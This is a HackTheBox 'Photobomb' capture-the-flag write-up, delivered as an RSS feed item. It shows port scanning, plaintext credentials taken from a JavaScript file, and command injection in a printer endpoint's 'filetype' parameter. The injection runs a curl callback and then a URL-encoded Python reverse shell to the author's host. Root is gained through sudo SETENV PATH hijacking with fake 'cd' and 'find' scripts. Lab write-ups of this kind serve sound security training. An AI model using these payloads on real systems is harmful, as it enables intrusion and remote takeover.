@@ -1,0 +1,251 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Setenv-Abuse on</title><link>https://h4r1337.github.io/tags/setenv-abuse/</link><description>Recent content in Setenv-Abuse on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 12 Feb 2023 00:07:40 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/setenv-abuse/index.xml" rel="self" type="application/rss+xml"/><item><title>Photobomb | HackTheBox</title><link>https://h4r1337.github.io/posts/photobomb/</link><pubDate>Sun, 12 Feb 2023 00:07:40 +0530</pubDate><guid>https://h4r1337.github.io/posts/photobomb/</guid><description>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/photobomb/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Photobomb">photobomb&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/85231">&lt;img src="https://www.hackthebox.com/badge/image/85231" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Photobomb
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>In this easy machine we will use the plain text password used in a js file to log in to the server at port 80. Then by exploiting an RCE on a vulnerable endpoint we will gain initial access to the machine. From there we will privesc to root by abusing the setenv directive&lt;/p></description><content>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/photobomb/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Photobomb">photobomb&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/85231">&lt;img src="https://www.hackthebox.com/badge/image/85231" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Photobomb
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>In this easy machine we will use the plain text password used in a js file to log in to the server at port 80. Then by exploiting an RCE on a vulnerable endpoint we will gain initial access to the machine. From there we will privesc to root by abusing the setenv directive&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
+&lt;p>Scanned all TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> nmap -p- -T4 --min-rate &lt;span style="color:#d3869b">10000&lt;/span> -oA nmap/ports 10.10.11.182
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> photobomb.htb &lt;span style="color:#fe8019">(&lt;/span>10.10.11.182&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#fe8019">(&lt;/span>0.56s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#d3869b">65489&lt;/span> filtered ports, &lt;span style="color:#d3869b">44&lt;/span> closed ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Nmap done at Sat Jan 21 11:44:06 2023 -- 1 IP address (1 host up) scanned in 74.49 seconds&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enumerated open TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> nmap -sC -sV 10.10.11.182 -oA nmap/service
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting Nmap 7.80 &lt;span style="color:#fe8019">(&lt;/span> https://nmap.org &lt;span style="color:#fe8019">)&lt;/span> at 2023-01-21 11:44 IST
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> photobomb.htb &lt;span style="color:#fe8019">(&lt;/span>10.10.11.182&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#fe8019">(&lt;/span>0.52s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#d3869b">995&lt;/span> closed ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http nginx 1.18.0 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: nginx/1.18.0 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>163/tcp filtered cmip-man
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8649/tcp filtered unknown
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10025/tcp filtered unknown
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap &lt;span style="color:#fe8019">done&lt;/span>: &lt;span style="color:#d3869b">1&lt;/span> IP address &lt;span style="color:#fe8019">(&lt;/span>&lt;span style="color:#d3869b">1&lt;/span> host up&lt;span style="color:#fe8019">)&lt;/span> scanned in 120.20 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="port-80---http-nginx-1180">Port 80 - HTTP (Nginx 1.18.0)&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/photobomb/Pasted%20image%2020230121115108.webp">&lt;/figure>
+&lt;p>There&amp;rsquo;s a printer directory which requires some credentials to access.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/photobomb/Pasted%20image%2020230121115159.webp">&lt;/figure>
+&lt;p>There&amp;rsquo;s a javascript file &lt;code>photobomb.js&lt;/code> and inside that there was the username &amp;amp; password in plain text.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/photobomb/Pasted%20image%2020230121115318.webp">&lt;/figure>
+&lt;ul>
+&lt;li>username: &lt;code>pH0t0&lt;/code>&lt;/li>
+&lt;li>password: &lt;code>b0Mb!&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/photobomb/Pasted%20image%2020230121115439.webp">&lt;/figure>
+&lt;p>We can download images with various aspect ratio from this page. The request is like this:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">POST&lt;/span> /printer &lt;span style="color:#fe8019">HTTP&lt;/span>&lt;span style="color:#fe8019">/&lt;/span>&lt;span style="color:#d3869b">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#fe8019">:&lt;/span> photobomb.htb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#fe8019">:&lt;/span> Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#fe8019">:&lt;/span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Language&lt;span style="color:#fe8019">:&lt;/span> en-US,en;q=0.5
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#fe8019">:&lt;/span> gzip, deflate
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#fe8019">:&lt;/span> application/x-www-form-urlencoded
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#fe8019">:&lt;/span> 78
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Origin&lt;span style="color:#fe8019">:&lt;/span> http://photobomb.htb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authorization&lt;span style="color:#fe8019">:&lt;/span> Basic cEgwdDA6YjBNYiE=
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#fe8019">:&lt;/span> keep-alive
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#fe8019">:&lt;/span> http://photobomb.htb/prin
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;amp;filetype=jpg&amp;amp;dimensions=3000x2000
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I tried changing &lt;code>photo&lt;/code> parameter to &lt;code>../../../../../../etc/passwd&lt;/code> and it throws an error:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">POST&lt;/span> /printer &lt;span style="color:#fe8019">HTTP&lt;/span>&lt;span style="color:#fe8019">/&lt;/span>&lt;span style="color:#d3869b">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#fe8019">:&lt;/span> photobomb.htb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#fe8019">:&lt;/span> Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#fe8019">:&lt;/span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Language&lt;span style="color:#fe8019">:&lt;/span> en-US,en;q=0.5
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#fe8019">:&lt;/span> gzip, deflate
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#fe8019">:&lt;/span> http://photobomb.htb/printer
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#fe8019">:&lt;/span> 65
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Origin&lt;span style="color:#fe8019">:&lt;/span> http://photobomb.htb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#fe8019">:&lt;/span> keep-alive
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Upgrade-Insecure-Requests&lt;span style="color:#fe8019">:&lt;/span> 1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#fe8019">:&lt;/span> application/x-www-form-urlencoded
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authorization&lt;span style="color:#fe8019">:&lt;/span> Basic cEgwdDA6YjBNYiE=
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Pragma&lt;span style="color:#fe8019">:&lt;/span> no-cache
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache-Control&lt;span style="color:#fe8019">:&lt;/span> no-cache
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>photo=../../../../../../etc/passwd&amp;amp;filetype=&amp;amp;dimensions=3000x2000
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>which results in an error:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">HTTP&lt;/span>&lt;span style="color:#fe8019">/&lt;/span>&lt;span style="color:#d3869b">1.1&lt;/span> &lt;span style="color:#d3869b">500&lt;/span> &lt;span style="color:#fb4934">Internal Server Error&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Server&lt;span style="color:#fe8019">:&lt;/span> nginx/1.18.0 (Ubuntu)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Date&lt;span style="color:#fe8019">:&lt;/span> Sat, 21 Jan 2023 06:28:14 GMT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#fe8019">:&lt;/span> text/html;charset=utf-8
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#fe8019">:&lt;/span> 14
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#fe8019">:&lt;/span> keep-alive
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Xss-Protection&lt;span style="color:#fe8019">:&lt;/span> 1; mode=block
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Content-Type-Options&lt;span style="color:#fe8019">:&lt;/span> nosniff
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#fe8019">:&lt;/span> SAMEORIGIN
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Invalid photo.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="rce-on-filetype-parameter">RCE on &lt;code>filetype&lt;/code> parameter&lt;/h3>
+&lt;p>I tried adding RCE payloads to all parameters and &lt;code>filetype&lt;/code> parameter is vulnerable to RCE. We can test it by combining &lt;code>python&lt;/code> and &lt;code>curl&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> python3 -m http.server &lt;span style="color:#d3869b">8081&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Serving HTTP on 0.0.0.0 port &lt;span style="color:#d3869b">8081&lt;/span> &lt;span style="color:#fe8019">(&lt;/span>http://0.0.0.0:8081/&lt;span style="color:#fe8019">)&lt;/span> ...
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> curl &lt;span style="color:#b8bb26">&amp;#39;http://photobomb.htb/printer&amp;#39;&lt;/span> -X POST -H &lt;span style="color:#b8bb26">&amp;#39;Authorization: Basic cEgwdDA6YjBNYiE=&amp;#39;&lt;/span> --data-raw &lt;span style="color:#b8bb26">&amp;#39;photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;amp;filetype=jpg;curl+http://10.10.14.35:8081/&amp;amp;dimensions=3000x2000&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And we got connection from the server:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/photobomb/Pasted%20image%2020230121121051.webp">&lt;/figure>
+&lt;p>I went to &lt;a href="revshells.com">revshells&lt;/a> and generated the &lt;code>Python3 #1&lt;/code> reverse shell with my IP and port. Make sure it is &lt;strong>URL-encoded&lt;/strong>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> curl &lt;span style="color:#b8bb26">&amp;#39;http://photobomb.htb/printer&amp;#39;&lt;/span> -X POST -H &lt;span style="color:#b8bb26">&amp;#39;Authorization: Basic cEgwdDA6YjBNYiE=&amp;#39;&lt;/span> --data-raw &lt;span style="color:#b8bb26">&amp;#39;photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;amp;filetype=jpg;export%20RHOST%3D%2210.10.14.35%22%3Bexport%20RPORT%3D1234%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22bash%22%29%27&amp;amp;dimensions=3000x2000&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We got a shell as user &lt;code>wizard&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> nc -lnvp &lt;span style="color:#d3869b">1234&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Listening on 0.0.0.0 &lt;span style="color:#d3869b">1234&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection received on 10.10.11.182 &lt;span style="color:#d3869b">59550&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wizard@photobomb:~/photobomb$ id
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>id
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>wizard&lt;span style="color:#fe8019">)&lt;/span> gid&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>wizard&lt;span style="color:#fe8019">)&lt;/span> groups&lt;span style="color:#fe8019">=&lt;/span>1000&lt;span style="color:#fe8019">(&lt;/span>wizard&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wizard@photobomb:~/photobomb$ whoami
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>whoami
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wizard
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wizard@photobomb:~/photobomb$ &lt;span style="color:#fabd2f">pwd&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">pwd&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/home/wizard/photobomb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;h3 id="privilege-escalation-vector">Privilege Escalation vector&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>wizard@photobomb:~/photobomb$ sudo -l
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo -l
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Matching Defaults entries &lt;span style="color:#fe8019">for&lt;/span> wizard on photobomb:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> env_reset, mail_badpass,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> secure_path&lt;span style="color:#fe8019">=&lt;/span>/usr/local/sbin&lt;span style="color:#b8bb26">\:&lt;/span>/usr/local/bin&lt;span style="color:#b8bb26">\:&lt;/span>/usr/sbin&lt;span style="color:#b8bb26">\:&lt;/span>/usr/bin&lt;span style="color:#b8bb26">\:&lt;/span>/sbin&lt;span style="color:#b8bb26">\:&lt;/span>/bin&lt;span style="color:#b8bb26">\:&lt;/span>/snap/bin
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User wizard may run the following commands on photobomb:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">(&lt;/span>root&lt;span style="color:#fe8019">)&lt;/span> SETENV: NOPASSWD: /opt/cleanup.sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SETENV&lt;/code> directive is set. So we can change the &lt;code>PATH&lt;/code> variable and run the script with root access. If you want to know more about this attack, check out:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">hackingarticles.in&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#setenv">hacktricks.xyz&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>&lt;code>/opt/cleanup.sh :&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>. /opt/.bashrc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">cd&lt;/span> /home/wizard/photobomb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># clean up log files&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> -s log/photobomb.log &lt;span style="color:#fe8019">]&lt;/span> &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> ! &lt;span style="color:#fe8019">[&lt;/span> -L log/photobomb.log &lt;span style="color:#fe8019">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /bin/cat log/photobomb.log &amp;gt; log/photobomb.log.old
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> /usr/bin/truncate -s0 log/photobomb.log
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># protect the priceless originals&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>find source_images -type f -name &lt;span style="color:#b8bb26">&amp;#39;*.jpg&amp;#39;&lt;/span> -exec chown root:root &lt;span style="color:#fe8019">{}&lt;/span> &lt;span style="color:#b8bb26">\;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here they are using full path for the commands &lt;code>cat&lt;/code> and &lt;code>truncate&lt;/code> but not for &lt;code>cd&lt;/code> and &lt;code>find&lt;/code>. So we can create files named either &lt;code>cd&lt;/code> or &lt;code>find&lt;/code> and the current working directory to the path. When the script &lt;code>cleanup.sh&lt;/code> will execute with the updated path it will execute the &lt;code>cd&lt;/code> and &lt;code>find&lt;/code> we created instead of the original ones.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>wizard@photobomb:~$ &lt;span style="color:#fabd2f">echo&lt;/span> -e &lt;span style="color:#b8bb26">&amp;#39;#!/bin/bash\nbash&amp;#39;&lt;/span> &amp;gt; &lt;span style="color:#fabd2f">cd&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> -e &lt;span style="color:#b8bb26">&amp;#39;#!/bin/bash\nbash&amp;#39;&lt;/span> &amp;gt; &lt;span style="color:#fabd2f">cd&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wizard@photobomb:~$ &lt;span style="color:#fabd2f">echo&lt;/span> -e &lt;span style="color:#b8bb26">&amp;#39;#!/bin/bash\nbash&amp;#39;&lt;/span> &amp;gt; find
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> -e &lt;span style="color:#b8bb26">&amp;#39;#!/bin/bash\nbash&amp;#39;&lt;/span> &amp;gt; find
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wizard@photobomb:~$ chmod +x &lt;span style="color:#fabd2f">cd&lt;/span> find
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod +x &lt;span style="color:#fabd2f">cd&lt;/span> find
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And either the &lt;code>cd&lt;/code> or the &lt;code>find&lt;/code> script will give us root shell.&lt;/p>
